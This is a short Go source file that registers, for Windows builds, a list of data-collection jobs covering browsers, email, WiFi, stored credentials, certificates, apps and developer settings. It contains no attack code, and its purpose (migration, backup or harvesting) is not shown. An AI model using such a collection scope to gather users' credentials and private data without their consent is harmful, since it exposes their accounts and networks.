//go:build windows

package jobs

func init() {
	allJobs = []Job{
		&UserDataJob{},
		&BrowsersJob{},
		&BookmarksJob{},
		&EmailJob{},
		&WiFiJob{},
		&CredentialsJob{},
		&CertificatesJob{},
		&AppsJob{},
		&DevEnvJob{},
		&AppConfigJob{},
	}
}
